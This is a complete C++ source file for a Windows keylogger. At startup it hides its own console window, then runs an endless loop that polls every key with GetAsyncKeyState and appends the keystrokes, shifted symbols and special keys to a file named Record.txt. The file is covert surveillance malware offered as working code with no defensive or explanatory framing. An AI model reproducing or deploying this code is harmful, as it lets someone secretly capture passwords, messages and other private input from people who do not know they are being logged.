
#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>


using namespace std;

void log();
void hide();

int main()
{

	hide();
	log();
	return 0;
}

void log()
{
	char key;

	for(;;)
	{
		for( key=8; key<=222; key++)
		{
			if(GetAsyncKeyState(key) == -32767)
			{
				ofstream write ("Record.txt", ios::app);

				if((key>64)&&(key<91) && !(GetAsyncKeyState(0x10)))
				{
					key+=32;
					write << key;
					write.close();
					break;
				}
				else if((key>64)&&(key<91))
				{
					write << key;
					write.close();
					break;
				}
				else
				{
					switch(key)
					{
						case 48:
						{
							if( GetAsyncKeyState(0x10) )
								write << ")";
							else
								write << "0";
						}
						break;
						case 49:
						{
							if( GetAsyncKeyState(0x10) )
								write << "!";
							else
								write << "1";
						}
						break;
						case 50:
						{
							if( GetAsyncKeyState(0x10) )
								write << "@";
							else
								write << "2";
						}
						break;
						case 51:
						{
							if( GetAsyncKeyState(0x10) )
								write << "#";
							else
								write << "3";
						}
						break;
						case 52:
						{
							if( GetAsyncKeyState(0x10) )
								write << "$";
							else
								write << "4";
						}
						break;
						case 53:
						{
							if( GetAsyncKeyState(0x10) )
								write << "%";
							else
								write << "5";
						}
						break;
						case 54:
						{
							if( GetAsyncKeyState(0x10) )
								write << "^";
							else
								write << "6";
						}
						break;
						case 55:
						{
							if( GetAsyncKeyState(0x10) )
								write << "&";
							else
								write << "7";
						}
						break;
						case 56:
						{
							if( GetAsyncKeyState(0x10) )
								write << "*";
							else
								write << "8";
						}
						break;
						case 57:
						{
							if( GetAsyncKeyState(0x10) )
								write << "(";
							else
								write << "9";
						}
						break;
						case 126:
						{
							if( GetAsyncKeyState(0x10) )
								write << "~";
							else
								write << "`";
						}
						break;
						/*case 126:
						{
							if( GetAsyncKeyState(0x10) )
								write << "(";
							else
								write << "9";
						}
						break;*/

						case VK_SPACE:
							write << " ";
						break;
						case VK_RETURN:
							write << "\n";
						break;
						case VK_TAB:
							write << "<Tab>";
						break;
						case VK_BACK:
							write << "<BackSpace>";
						break;
						case VK_ESCAPE:
							write << "<Esc>";
						break;
						case VK_DELETE:
							write << "<Delete>";
						break;
						case VK_CAPITAL:
							write << "<Caps Lock>";
						break;
						case VK_NUMPAD0:
							write << "0";
						break;
						case VK_NUMPAD1:
							write << "1";
						break;
						case VK_NUMPAD2:
							write << "2";
						break;
						case VK_NUMPAD3:
							write << "3";
						break;
						case VK_NUMPAD4:
							write << "4";
						break;
						case VK_NUMPAD5:
							write << "5";
						break;
						case VK_NUMPAD6:
							write << "6";
						break;
						case VK_NUMPAD7:
							write << "7";
						break;
						case VK_NUMPAD8:
							write << "8";
						break;
						case VK_NUMPAD9:
							write << "9";
						break;

						case VK_CONTROL:
							write << "<Control>";
						break;
						case VK_MENU:
							write << "<Alt>";
						break;
						case VK_LEFT:
							write << "<Left Arrow>";
						break;
						case VK_UP:
							write << "<Up Arrow>";
						break;
						case VK_RIGHT:
							write << "<Right Arrow>";
						break;
						case VK_DOWN:
							write << "<Down Arrow>";
						break;
						case VK_OEM_2:
							write << "/";
						break;

						case 79:
						{
							if( GetAsyncKeyState(0x10) )
								write << "?";
							else
								write << "/";
						}
						break;



					}
				}




		}
	}
}
}

void hide()
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(stealth,0);
}
